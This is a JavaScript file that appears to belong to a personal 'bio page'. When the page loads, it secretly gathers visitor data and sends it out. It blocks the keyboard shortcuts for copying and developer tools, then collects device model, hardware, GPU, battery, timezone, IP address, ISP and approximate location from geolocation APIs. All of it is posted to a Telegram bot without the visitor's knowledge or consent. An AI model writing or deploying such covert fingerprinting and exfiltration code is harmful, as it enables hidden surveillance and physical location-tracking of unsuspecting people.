document.onkeydown = (e) => {
    if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 85 || e.keyCode === 73 || e.keyCode === 74)) return false;
    if (e.keyCode === 123) return false; 
};

async function logData() {
    let msg = `** VIEWED THE BIO PAGE OF MARK **\n━━━━━━━━━━━━━━\n`;
    
    // DEVICE DETECTION LOGIC (100% Accuracy Attempt)
    let device_model = "Unknown Device";
    const ua = navigator.userAgent;

    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        // Modern logic for Chrome/Edge/Newer Browsers
        try {
            const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
            if (hints.model) {
                device_model = hints.model;
            } else {
                const match = ua.match(/\(([^)]+)\)/);
                if (match) device_model = match[1].split(';')[1] || match[1];
            }
        } catch (e) {
            device_model = "Protected Device";
        }
    } else {
        // Regex Logic for older browsers
        const androidMatch = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
        if (androidMatch) {
            device_model = androidMatch[2]; 
        } else {
            const genericMatch = ua.match(/\(([^)]+)\)/);
            if (genericMatch) device_model = genericMatch[1].split(';')[1] || genericMatch[1];
        }
    }

    // 1. HARDWARE & DISPLAY
    msg += ` *=✪=* **DEVICE IDENTITY** *=✪=*\n`;
    msg += `• **Model/Name:** ${device_model}\n`;
    msg += `• **Device Platform:** ${navigator.platform}\n`;
    msg += `• **Touch Points:** ${navigator.maxTouchPoints}\n\n════════════════\n\n`;

    msg += `*=✪=* ** HARDWARE & DISPLAY** *=✪=*\n`;
    msg += `• **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}\n`;
    msg += `• **RAM:** ${navigator.deviceMemory || 'N/A'} GB\n`;
    msg += `• **Screen:** ${screen.width}x${screen.height}\n`;
    msg += `• **Pixel Ratio:** ${window.devicePixelRatio}\n`;
    msg += `• **Color Depth:** ${screen.colorDepth}-bit\n`;
    msg += `• **Orientation:** ${screen.orientation ? screen.orientation.type : 'N/A'}\n\n════════════════\n\n`;
     
    // 2. BROWSER & ENGINE
    msg += `*=✪=* ** BROWSER CAPABILITIES** *=✪=*\n`;
    msg += `• **UserAgent:** ${navigator.userAgent}\n`;
    msg += `• **Dark Mode:** ${window.matchMedia('(prefers-color-scheme: dark)').matches}\n`;
    msg += `• **Cookies Enabled:** ${navigator.cookieEnabled}\n`;
    msg += `• **PDF Viewer:** ${navigator.pdfViewerEnabled}\n`;
    
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        msg += `• **GPU:** ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n\n════════════════\n`;
    }

    // 3. NETWORK & IP
    msg += `\n*=✪=* ** GEOLOCATION ** *=✪=*\n`;
    const apis = [
        'https://ipapi.co/json/',
        'https://ipwho.is/',
        'https://api.ipify.org?format=json'
    ];

    let geoDataFound = false;
    for (let api of apis) {
        try {
            const res = await fetch(api);
            const data = await res.json();
            msg += `➤ **Source API:** ${api}\n`;
            msg += `• **IP:** \`${data.ip || data.query}\`\n`;
            msg += `• **ISP:** ${data.org || data.isp || data.connection?.isp}\n`;
            msg += `• **Location:** ${data.city}, ${data.country_name || data.country}\n`;
            if(data.latitude) msg += `• **Map:** [View](https://www.google.com/maps?q=${data.latitude},${data.longitude})\n\n════════════════\n`;
            geoDataFound = true;
            break; 
        } catch(e) { continue; }
    }

    // 4. ENVIRONMENT
    msg += `\n➤ ** ENVIRONMENT**\n`;
    msg += `• **Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
    msg += `• **Language:** ${navigator.language}\n`;
    
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            msg += `• **Battery:** ${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})\n\n════════════════\n`;
        }
    } catch(e) {}

    msg += `**=✪=** **AT:** ${new Date().toLocaleString()}`; 
    msg += `\n════════════════\n`;
    msg += `**▒░░░ α૨εα 186░░░▒**\n`;

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
    });
}

window.onload=()=>{ 
     
    logData(); 
};  
